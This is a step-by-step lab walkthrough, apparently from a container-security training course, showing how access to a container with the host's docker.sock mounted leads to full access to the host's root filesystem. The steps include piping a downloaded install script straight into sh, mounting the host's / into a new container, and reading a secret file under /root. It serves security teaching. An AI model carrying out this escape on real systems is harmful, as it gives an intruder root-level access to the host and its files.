## Docker Daemon Direct Access

###### A malicious user who gains access to a container where the `docker.sock` of host machine is exposed, can gain access to the host machine.

##### Step 1:
* Open Terminal

	![](img/Open-Terminal.png)

##### Step 2:
*  **cd** into  `Labs/3.0.0-Container-Attacks/3.2.0`

    ```commandline
    cd Labs/3.0.0-Container-Attacks/3.2.0
    ```
##### Step 3:
* Run `docker run -d -v /var/run/docker.sock:/var/run/docker.sock --name vul_flask abhaybhargav/vul_flask` to start a docker container.

    ```commandline
    root@we45:~/Labs/3.0.0-Container-Attacks/3.2.0# docker run -d -v /var/run/docker.sock:/var/run/docker.sock --name vul_flask abhaybhargav/vul_flask
    1681e86d567eaa2b7344cff0535819fffe8f3a786b4b768be3c95d9b40a4e71d
    ```
      
    ![](img/docker-run.png)
 
##### Step 4:   
* Run `docker ps` to view, all running containers.

    ```commandline
    root@we45:~/Labs/3.0.0-Container-Attacks/3.2.0# docker ps
    CONTAINER ID        IMAGE                    COMMAND             CREATED              STATUS              PORTS               NAMES
    1681e86d567e        abhaybhargav/vul_flask   "python app.py"     About a minute ago   Up About a minute   5050/tcp            vul_flask/tcp            vul_flask
    ```
     
    ![](img/docker-ps.png)
    
##### Step 5:   
* Run `docker exec -it vul_flask bash` to exec into a running container.

    ```commandline
    root@we45:~/Labs/3.0.0-Container-Attacks/3.2.0# docker exec -it vul_flask bash
    root@1681e86d567e:/apps# 
    ```
    ![](img/docker-exec.png)

##### Step 6:
* Install docker-engine by running `apt-get update && apt-get install wget -y && wget -qO- https://get.docker.com | sh`.

    ```commandline
    root@1681e86d567e:/apps# apt-get update && apt-get install wget -y && wget -qO- https://get.docker.com | sh
    Get:1 http://security.debian.org jessie/updates InRelease [44.9 kB]
    Ign http://deb.debian.org jessie InRelease          
    Get:2 http://deb.debian.org jessie-updates InRelease [145 kB]
    Get:3 http://deb.debian.org jessie Release.gpg [2420 B]                               
    Get:4 http://deb.debian.org jessie Release [148 kB]              
    Get:5 http://deb.debian.org jessie-updates/main amd64 Packages [23.0 kB]          
    Get:6 http://deb.debian.org jessie/main amd64 Packages [9098 kB]       
    Get:7 http://security.debian.org jessie/updates/main amd64 Packages [663 kB]
    Fetched 10.1 MB in 21s (480 kB/s)                                                                                                                            
    Reading package lists... Done
    Reading package lists... Done
    Building dependency tree       
    Reading state information... Done
    The following packages will be upgraded:
      wget
    1 upgraded, 0 newly installed, 0 to remove and 66 not upgraded.
    Need to get 496 kB of archives.
    After this operation, 362 kB disk space will be freed.
    Get:1 http://deb.debian.org/debian/ jessie/main wget amd64 1.16-1+deb8u5 [496 kB]
    Fetched 496 kB in 1s (288 kB/s)
    debconf: delaying package configuration, since apt-utils is not installed
    (Reading database ... 21636 files and directories currently installed.)
    Preparing to unpack .../wget_1.16-1+deb8u5_amd64.deb ...
    Unpacking wget (1.16-1+deb8u5) over (1.16-1+deb8u4) ...
    Setting up wget (1.16-1+deb8u5) ...
    # Executing docker install script, commit: 36b78b2
    + sh -c apt-get update -qq >/dev/null
    + sh -c apt-get install -y -qq apt-transport-https ca-certificates curl >/dev/null
    debconf: delaying package configuration, since apt-utils is not installed
    + sh -c curl -fsSL "https://download.docker.com/linux/debian/gpg" | apt-key add -qq - >/dev/null
    + sh -c echo "deb [arch=amd64] https://download.docker.com/linux/debian jessie edge" > /etc/apt/sources.list.d/docker.list
    + [ debian = debian ]
    + [ jessie = wheezy ]
    + sh -c apt-get update -qq >/dev/null
    + sh -c apt-get install -y -qq --no-install-recommends docker-ce >/dev/null
    debconf: delaying package configuration, since apt-utils is not installed
    + sh -c docker version
    Client:
     Version:           18.06.1-ce
     API version:       1.38
     Go version:        go1.10.3
     Git commit:        e68fc7a
     Built:             Tue Aug 21 17:25:03 2018
     OS/Arch:           linux/amd64
     Experimental:      false
    
    Server:
     Engine:
      Version:          18.06.1-ce
      API version:      1.38 (minimum version 1.12)
      Go version:       go1.10.3
      Git commit:       e68fc7a
      Built:            Tue Aug 21 17:23:24 2018
      OS/Arch:          linux/amd64
      Experimental:     false
    If you would like to use Docker as a non-root user, you should now consider
    adding your user to the "docker" group with something like:
    
      sudo usermod -aG docker your-user
    
    Remember that you will have to log out and back in for this to take effect!
    
    WARNING: Adding a user to the "docker" group will grant the ability to run
             containers which can be used to obtain root privileges on the
             docker host.
             Refer to https://docs.docker.com/engine/security/security/#docker-daemon-attack-surface
             for more information.
    ```

##### Step 7:
*  Once docker is installed, run `docker run -ti -v /:/hostFS/ ubuntu:16.04 /bin/bash`

    ```commandline
    root@1681e86d567e:/apps# docker run -ti -v /:/hostFS/ ubuntu:16.04 /bin/bash
    root@b412be8326b5:/#
    ```

##### Step 8:
* Run `cd /hostFS/root/` to access the toot directory.

    ```commandline
    root@b412be8326b5:/# cd /hostFS/root/    
    ```
    
##### Step 9:  
* Run `ls` to check the secret.txt file inside a container.

    ```commandline
    root@b412be8326b5:/hostFS/root# ls
    secret.txt
    ``` 
    
##### Step 10:
* Run `cat secret.txt` to view the content of the file.

```commandline
root@b412be8326b5:/hostFS/root# cat secret.txt 
secret
``` 
**Note:** Malicious user now has complete access to the root Filesystem of the host machine.

##### Step 11:
* Run `exit` to exit from the Malicious container.

    ```commandline
    root@b412be8326b5:/hostFS/root# exit
    exit
    ```

##### Step 12:
* Run `exit` to exit from the container.

    ```commandline
    root@1681e86d567e:/apps# exit
    exit
    ```
##### Step 13:   
* Run `docker stop vul_flask` to stop the running container.

    ```commandline
    root@we45:~/Labs/3.0.0-Container-Attacks/3.2.0# docker stop vul_flask
    vul_flask
    ```
        
    ![](img/docker-stop.png)  
    
##### Step 14:   
* Run `docker rm vul_flask` to remove stopped container.

    ```commandline
    root@we45:~/Labs/3.0.0-Container-Attacks/3.2.0# docker rm vul_flask
    vul_flask
    ```
    ![](img/docker-rm.png)
